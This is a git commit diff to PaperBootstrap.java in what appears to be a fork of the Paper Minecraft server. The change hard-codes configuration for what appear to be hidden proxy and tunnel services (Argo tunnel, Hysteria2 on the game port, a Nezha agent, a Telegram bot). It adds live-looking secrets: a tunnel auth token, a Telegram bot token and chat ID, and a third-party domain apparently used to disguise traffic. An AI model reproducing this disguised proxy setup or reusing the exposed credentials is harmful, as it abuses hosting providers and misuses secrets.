77a5c440129029a3ba197b151e46a58e5f6d7e16
mzhangxy <96800168+mzhangxy@users.noreply.github.com>
2025-11-01 00:45:58 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,22 +92,22 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "5429d9a1-b787-42b7-8957-bbf1839bf967");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "freeze.colorrora.com");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNGRhNjUzZjctMTY0MC00ZDg2LTk5ZjYtZjcwZDA0Njk5NzI3IiwicyI6Ik16VmpPVEF6WkRFdFpEQmpOeTAwTm1abUxXSTRNamN0TldVek56TTJOelU1TUdJNSJ9");
+        envVars.put("HY2_PORT", "25565");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
+        envVars.put("CHAT_ID", "8093926960");
+        envVars.put("BOT_TOKEN", "8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8");
+        envVars.put("CFIP", "store.ubi.com");
+        envVars.put("CFPORT", "3000");
         envVars.put("NAME", "Mc");
         
         for (String var : ALL_ENV_VARS) {
